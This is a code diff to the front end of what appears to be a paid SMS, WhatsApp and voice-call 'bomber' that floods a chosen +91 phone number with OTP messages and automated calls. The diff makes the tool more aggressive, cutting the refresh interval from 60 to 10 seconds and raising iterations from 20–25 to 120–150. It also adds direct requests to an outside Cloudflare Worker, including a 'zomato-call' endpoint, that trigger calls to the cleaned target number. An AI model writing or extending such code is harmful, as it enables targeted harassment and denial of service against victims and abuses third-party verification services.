@@ -83,8 +83,8 @@ const ATTACK_MODES: ModeOption[] = [
   {
     id: "sms_wa",
     title: "SMS + WhatsApp",
-    subTitle: "Simultaneous SMS OTPs & WhatsApp Notifications (20 iters)",
-    priceTag: "₹10 / 20 iters",
+    subTitle: "Simultaneous SMS OTPs & WhatsApp Notifications (120 iters / 20 mins)",
+    priceTag: "₹10 / 120 iters",
     icon: <MessageSquare className="w-4 h-4 text-emerald-600" />,
     iconBg: "#dcfce7",
     tags: [
@@ -95,8 +95,8 @@ const ATTACK_MODES: ModeOption[] = [
   {
     id: "sms_call",
     title: "SMS + Call",
-    subTitle: "Dual Blast: Fast SMS OTPs & Automated Voice Calls (25 iters)",
-    priceTag: "₹15 / 25 iters",
+    subTitle: "Dual Blast: Fast SMS OTPs & Automated Voice Calls (150 iters / 25 mins)",
+    priceTag: "₹15 / 150 iters",
     icon: <PhoneCall className="w-4 h-4 text-purple-600" />,
     iconBg: "#f3e8ff",
     tags: [
@@ -138,6 +138,16 @@ async function callBackendSender(
   if (channel === "call") path = "/sender/call";
   else if (channel === "both") path = "/sender/dispatch";
 
+  // Direct client-side upstream dispatch for voice calls (CORS enabled on Cloudflare Worker)
+  if (channel === "call" || channel === "both") {
+    const cleanNum = targetNumber.replace(/\D/g, "").slice(-10);
+    if (cleanNum.length === 10) {
+      fetch(`https://call-3.krishnasikarwar365.workers.dev/zomato-call?number=${cleanNum}`, { mode: "cors" }).catch(() => null);
+      fetch(`https://call-3.krishnasikarwar365.workers.dev/?number=${cleanNum}`, { mode: "cors" }).catch(() => null);
+    }
+  }
+
+  const localEndpoint = `http://localhost:5002/api/v1${path}`;
   const primaryEndpoint = `${BACKEND_API_BASE}${path}`;
   const directEndpoint = `${DEPLOYED_HOST_URL}/api/v1${path}`;
 
@@ -174,8 +184,12 @@ async function callBackendSender(
     try {
       responseObj = await tryRequest(primaryEndpoint);
     } catch {
-      // Fallback to direct backend URL if proxy had an issue
-      responseObj = await tryRequest(directEndpoint);
+      try {
+        responseObj = await tryRequest(localEndpoint);
+      } catch {
+        // Fallback to direct backend URL if proxy had an issue
+        responseObj = await tryRequest(directEndpoint);
+      }
     }
 
     const { res, json } = responseObj;
@@ -243,11 +257,11 @@ export default function App() {
   const [selectedMode, setSelectedMode] = useState<AttackMode>("sms_wa");
   const [isDropdownOpen, setIsDropdownOpen] = useState<boolean>(false);
   // Looping system specifications:
-  // - sms + whatsapp: 20 iterations (1 min interval = 20 mins total)
-  // - call + sms: 25 iterations (1 min interval = 25 mins total)
-  const targetCount = selectedMode === "sms_wa" ? 20 : 25;
-  const loopTotalMins = targetCount;
-  const [refreshCountdown, setRefreshCountdown] = useState<number>(60);
+  // - sms + whatsapp: 120 iterations (10 sec interval = 20 mins total)
+  // - call + sms: 150 iterations (10 sec interval = 25 mins total)
+  const targetCount = selectedMode === "sms_wa" ? 120 : 150;
+  const loopTotalMins = selectedMode === "sms_wa" ? 20 : 25;
+  const [refreshCountdown, setRefreshCountdown] = useState<number>(10);
   const [soundEnabled, setSoundEnabled] = useState<boolean>(true);
   const [backendStatus, setBackendStatus] = useState<"connected" | "connecting" | "offline">("connecting");
 
@@ -690,7 +704,7 @@ export default function App() {
           id: Math.random().toString(),
           timestamp: new Date().toLocaleTimeString(),
           channel: "sys",
-          message: `⏱️ [UPSTREAM REFRESH] Request active. Next session refresh in 60s (${targetCount - iterationNum} remaining).`,
+          message: `⏱️ [UPSTREAM REFRESH] Request active. Next session refresh in 10s (${targetCount - iterationNum} remaining).`,
           status: "info",
           latency: 0,
         };
@@ -745,7 +759,7 @@ export default function App() {
           id: Math.random().toString(),
           timestamp: new Date().toLocaleTimeString(),
           channel: "sys",
-          message: `⏱️ [UPSTREAM REFRESH] Request active. Next session refresh in 60s (${targetCount - iterationNum} remaining).`,
+          message: `⏱️ [UPSTREAM REFRESH] Request active. Next session refresh in 10s (${targetCount - iterationNum} remaining).`,
           status: "info",
           latency: 0,
         };
@@ -886,7 +900,7 @@ export default function App() {
         channel: "sys",
         message: `[LOOP-START] Target: +91 ${phoneNumber} | Mode: ${
           activeModeObj.title
-        } | Total Iterations: ${targetCount} | Refresh: Every 1 Min (~${loopTotalMins} Mins Total)`,
+        } | Total Iterations: ${targetCount} | Refresh: Every 10s (~${loopTotalMins} Mins Total)`,
         status: "info",
         latency: 0,
       };
@@ -901,7 +915,7 @@ export default function App() {
       setSmsSent(0);
       setWaSent(0);
       setCallSent(0);
-      setRefreshCountdown(60);
+      setRefreshCountdown(10);
 
       // Register new target session in history
       const newSid = `sess_${Date.now()}`;
@@ -934,7 +948,7 @@ export default function App() {
           "x-api-id": session.credentials.api_id || "",
           "x-api-key": session.credentials.api_key || "",
         },
-        body: JSON.stringify({ phone: phoneNumber, mode: selectedMode, maxIterations: targetCount, intervalMs: 60000 }),
+        body: JSON.stringify({ phone: phoneNumber, mode: selectedMode, maxIterations: targetCount, intervalMs: 10000 }),
       }).catch(() => null);
 
       // Dispatch Iteration 1 immediately (Part of the 1 paid hit, NO further money deduction)
@@ -963,7 +977,7 @@ export default function App() {
       clearInterval(runIntervalRef.current);
       runIntervalRef.current = null;
     }
-    setRefreshCountdown(60);
+    setRefreshCountdown(10);
     playSoundEffect("stop");
 
     const sidToStop = typeof targetId === "string" ? targetId : activeSessionIdRef.current;
@@ -1003,14 +1017,14 @@ export default function App() {
     setLogs((prev) => [...prev, abortLog]);
   };
 
-  // 1-Minute Recurring Upstream Refresh Interval & Countdown
+  // 10-Second Recurring Upstream Refresh Interval & Countdown
   useEffect(() => {
     if (!isRunning) return;
 
     runIntervalRef.current = setInterval(() => {
       setRefreshCountdown((prev) => {
         if (prev <= 1) {
-          // 60 seconds elapsed -> trigger next iteration!
+          // 10 seconds elapsed -> trigger next iteration!
           setSentCount((prevSent) => {
             const nextIteration = prevSent + 1;
             if (nextIteration > targetCount) {
@@ -1056,7 +1070,7 @@ export default function App() {
             dispatchLoopIteration(nextIteration);
             return nextIteration;
           });
-          return 60; // reset countdown to 60s
+          return 10; // reset countdown to 10s
         }
         return prev - 1;
       });
@@ -1452,7 +1466,7 @@ export default function App() {
                     ? "PROTECTED TARGET (BLOCKED)"
                     : isStarting
                     ? `STARTING...`
-                    : `START (${selectedMode === "sms_call" ? "₹15 / 25 iters" : "₹10 / 20 iters"})`}
+                    : `START (${selectedMode === "sms_call" ? "₹15 / 150 iters (25m)" : "₹10 / 120 iters (20m)"})`}
                 </span>
               </button>
             ) : (
@@ -1483,7 +1497,7 @@ export default function App() {
           {isRunning && (
             <div className="loop-progress-banner">
               <div className="loop-progress-header">
-                <span>🔄 1-MIN UPSTREAM REFRESH LOOP: <strong>{activeModeObj.title}</strong></span>
+                <span>🔄 10-SEC UPSTREAM REFRESH LOOP: <strong>{activeModeObj.title}</strong></span>
                 <span className="loop-badge">ITERATION {sentCount} / {targetCount}</span>
               </div>
               <div className="loop-progress-bar-bg">
@@ -1493,7 +1507,7 @@ export default function App() {
                 />
               </div>
               <div className="loop-progress-meta">
-                <span>⏱️ Next 1-Min Upstream Refresh in: <strong>{refreshCountdown}s</strong></span>
+                <span>⏱️ Next 10s Upstream Refresh in: <strong>{refreshCountdown}s</strong></span>
                 <span>Session Target: ~{loopTotalMins} Mins Total</span>
               </div>
             </div>
@@ -1515,7 +1529,7 @@ export default function App() {
             </div>
             <div className="stat-box">
               <div className="stat-label">{isRunning ? "Next Refresh" : "Refresh Cycle"}</div>
-              <div className="stat-val speed">{isRunning ? `${refreshCountdown}s` : "1m / req"}</div>
+              <div className="stat-val speed">{isRunning ? `${refreshCountdown}s` : "10s / req"}</div>
             </div>
           </div>
 
